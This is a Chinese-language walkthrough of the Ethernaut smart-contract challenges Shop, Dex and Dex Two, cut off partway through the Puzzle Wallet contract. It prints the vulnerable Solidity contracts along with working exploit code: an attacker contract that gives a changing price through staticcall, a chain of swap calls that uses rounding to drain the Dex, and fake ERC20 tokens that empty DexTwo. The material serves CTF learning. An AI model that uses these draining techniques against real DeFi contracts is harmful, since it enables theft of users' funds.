gas错误，由于需要耗尽gas，所有需要等待一段时间才可以看到结果。
# 21\. Shop
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    interface Buyer {
      function price() external view returns (uint);
    }
    contract Shop {
      uint public price = 100;
      bool public isSold;
      function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        if (_buyer.price() >= price && !isSold) {
          isSold = true;
          price = _buyer.price();
        }
      }
    }
这个题的要求是让我们以少于所需price的值完成购买，可以看到`buy`函数内部的逻辑和第11关差不多，唯一的区别在于这里的`price`函数是一个有`view`属性的函数。查阅solidity的[文档](https://docs.soliditylang.org/en/latest/contracts.html?highlight=view#view-functions)可知，有`view`属性的函数意味着它们不能修改状态，所谓修改状态，是指以下8种情况：
  1. 写状态变量
  2. 触发事件(emit events)
  3. 创建其他合约
  4. 使用`selfdestruct`
  5. 通过`call`发送以太币
  6. 使用call调用任何没有被标记为`view`或者`pure`的函数
  7. 使用低级的`call`
  8. 使用包含opcode的内联汇编
因此我们不能使用像第11关那样，使用一个状态变量来标记`price`函数是不是第一次被调用了。幸好这里给了一个`isSold`变量，在第一次调用`price`函数时，这个变量为false，而第二次为true，利用这一点，我们可以完成判断返回。但是由于`view`函数不允许低级的call，所以我们无法使用`call`调用`isSold`函数，但solidity有一个`staticcall`不会改变状态，并且可以在view函数内部使用，替代一下即可。代码如下：
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Buyer {
        address public target;
        constructor(address _addr) public{
            target=_addr;
        }
        function exploit() public  {
            bool b;
            (b,)=target.call{gas:100000}(abi.encodeWithSignature("buy()"));
            require(b);
        }
        function price() external view returns (uint result){
            bytes memory r;
            (,r)=target.staticcall(abi.encodeWithSignature("isSold()"));
            if(uint8(r[31])==0){
                result=1000;
            }else{
                result=1;
            }
            return result;
        }
    }
设置target为题目合约地址，然后执行exploit函数即可。如果出现out of gas可能需要在部署时调大gas limit。
这里说明比较特殊的一点，就是这个`uint8(r[31])`。因为`call`、`delegatecall`、`staticcall`返回的内容实际上都是`bytes
memory`，而根据题目合约我们知道，这个`isSold`是一个bool类型的值，为了进行判断我们需要将bytes动态数组转化为对应bool值。比如说，如果bool值为true,它对应的bytes数组实际上是`0x0000000000000000000000000000000000000000000000000000000000000001`，是一个32字节连续的数组。而我们取数组下标时，实际上是从高位开始取的，也就是说，`r[0]`是0x00，`r[1]`也是0x00，直到`r[31]`才是0x01，而在解析成bool值和数字时，我们又是从低位开始的，所以这里转化的时候我取了`r[31]`和0做比较，如果为0，说明`isSold`是false，也就是第一次访问，否则是第二次访问。
> 当然关于bytes -> bool /
> uint，还有其他很多种方式。比如我看有的wp是用opcode加载内存上的值来比较，有兴趣可以看[这篇](https://medium.com/@this_post/ethernaut-21-shop-> writeups-e99f3ebb9b7)，我这里选择直接调用`staticcall`，相对简单一点。还有一种方式是通过合约继承，可以参考[这篇](https://github.com/STYJ/Ethernaut-> Solutions)，这里不再赘述。
# 22 Dex
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import '@openzeppelin/contracts/math/SafeMath.sol';
    contract Dex  {
      using SafeMath for uint;
      address public token1;
      address public token2;
      constructor(address _token1, address _token2) public {
        token1 = _token1;
        token2 = _token2;
      }
      function swap(address from, address to, uint amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint swap_amount = get_swap_price(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swap_amount);
        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
      }
      function add_liquidity(address token_address, uint amount) public{
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
      }
      function get_swap_price(address from, address to, uint amount) public view returns(uint){
        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
      }
      function approve(address spender, uint amount) public {
        SwappableToken(token1).approve(spender, amount);
        SwappableToken(token2).approve(spender, amount);
      }
      function balanceOf(address token, address account) public view returns (uint){
        return IERC20(token).balanceOf(account);
      }
    }
    contract SwappableToken is ERC20 {
      constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
            _mint(msg.sender, initialSupply);
      }
    }
本题定义了一个用来交换货币的合约，其中token1和token2都是`SwappableToken`类型的一种erc20代币，这两个的地址在初始化实例时就确定了。题目初始状态，player拥有这两种代币的数量为10，而合约拥有数量为100，我们的最终目的是，将合约中某种代币的数量清0，也就是让合约拥有的token1或者token2代币的数量为0。
本题的漏洞点在于，在计算每次交换的代币数量时，`get_swap_price`函数内部使用了除法，而在接收这个结果的这一句，`swap_amount`定义为uint256类型，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币，从而达到清空题目合约拥有代币数的目的。下面说具体做法
在开始之前，先把player和合约账户给approve一下，方便后面转账
    await contract.approve(player,1000)
    await contract.approve(contract.address,1000)
接下来就是一个循环转账的过程，思路就是每一次都将我们当前拥有的代币全部交换，首先需要通过`await contract.token1()`和`await
contract.token2()`获取token1和token2的地址，这里我直接赋值给了变量
    token1 = (await contract.token1())
    token2 = (await contract.token2())
    //第一次交换
    await contract.swap(token1,token2,10)
    //第二次交换
    await contract.swap(token2,token1,20)
    //第三次交换
    await contract.swap(token1,token2,24)
    //第四次交换
    await contract.swap(token2,token1,30)
    //第五次交换
    await contract.swap(token1,token2,41)
    //第六次交换，注意这里是45就正好，多了会超过最大值报错
    await contract.swap(token2,token1,45)
中间可以使用如下命令获取不同地址对应不同token的余额
    (await contract.balanceOf(token1,player)).words[0]
    (await contract.balanceOf(token2,player)).words[0]
    (await contract.balanceOf(token1,contract.address)).words[0]
    (await contract.balanceOf(token2,contract.address)).words[0]
整个过程token的变化如上图所示，简单用excel写了一下。
总结一下，本题考察 ** _类型转换时的精度缺失问题_** 。 ~~利用这个问题左脚踩右脚上天~~
# 23.Dex Two
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import '@openzeppelin/contracts/math/SafeMath.sol';
    contract DexTwo  {
      using SafeMath for uint;
      address public token1;
      address public token2;
      constructor(address _token1, address _token2) public {
        token1 = _token1;
        token2 = _token2;
      }
      function swap(address from, address to, uint amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint swap_amount = get_swap_amount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swap_amount);
        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
      }
      function add_liquidity(address token_address, uint amount) public{
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
      }
      function get_swap_amount(address from, address to, uint amount) public view returns(uint){
        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
      }
      function approve(address spender, uint amount) public {
        SwappableTokenTwo(token1).approve(spender, amount);
        SwappableTokenTwo(token2).approve(spender, amount);
      }
      function balanceOf(address token, address account) public view returns (uint){
        return IERC20(token).balanceOf(account);
      }
    }
    contract SwappableTokenTwo is ERC20 {
      constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
            _mint(msg.sender, initialSupply);
      }
    }
Dex two版本的题目跟上一题相比，去掉了`require((from == token1 && to == token2) || (from ==
token2 && to == token1), "Invalid
tokens");`这一行，同时题目要求也变成要求我们让合约的2种token拥有数量都清0，思路就很清晰了，我们可以再写一个token，然后将合约中的token，全部转移到我们的第三方token中即可。
首先我们需要部署两个用来恶意转账的中间token合约，他们的代码是一样的
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol";
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";
    contract Mytoken is ERC20 {
        address public target;
      constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
            _mint(msg.sender, initialSupply);
      }
    }
这里在初始化的时候，设置`initialSupply`为200，也就是让我们初始拥有200个恶意token。然后approve题目地址，并转给题目地址100个token，这样我们和题目合约初始情况下各拥有100个恶意合约的token。这里我直接复用上个题的前半部分
然后执行如下代码即可
    await contract.approve(player,1000)
    await contract.approve(contract.address,1000)
    token1 = (await contract.token1())
    token2 = (await contract.token2())
    // mytoken1和mytoken2分别对应2个部署的恶意合约的地址
    mytoken1 = '0x3f4082b2CB234C9AA8a07aA155c490F30C3a1efC'
    mytoken2 = '0xe1f59E568302978f628500096e87A2763F6d1D5f'
    await contract.swap(mytoken1,token1,100)
    await contract.swap(mytoken2,token2,100)
# 24 Puzzle Wallet
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    pragma experimental ABIEncoderV2;
    import "@openzeppelin/contracts/math/SafeMath.sol";
    import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";
    contract PuzzleProxy is UpgradeableProxy {
        address public pendingAdmin;
        address public admin;
        constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
            admin = _admin;
        }
        modifier onlyAdmin {
          require(msg.sender == admin, "Caller is not the admin");
          _;
        }
        function proposeNewAdmin(address _newAdmin) external {
            pendingAdmin = _newAdmin;
        }
        function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
            require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
            admin = pendingAdmin;
        }
        function upgradeTo(address _newImplementation) external onlyAdmin {
            _upgradeTo(_newImplementation);
        }
    }
    contract PuzzleWallet {
        using SafeMath for uint256;
        address public owner;
        uint256 public maxBalance;
        mapping(address => bool) public whitelisted;
        mapping(address => uint256) public balances;
        function init(uint256 _maxBalance) public {
            require(maxBalance == 0, "Already initialized");
            maxBalance = _maxBalance;
            owner = msg.sender;
        }
        modifier onlyWhitelisted {
            require(whitelisted[msg.sender], "Not whitelisted");
            _;
        }
        function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
          require(address(this).balance == 0, "Contract balance is not 0");
          maxBalance = _maxBalance;
        }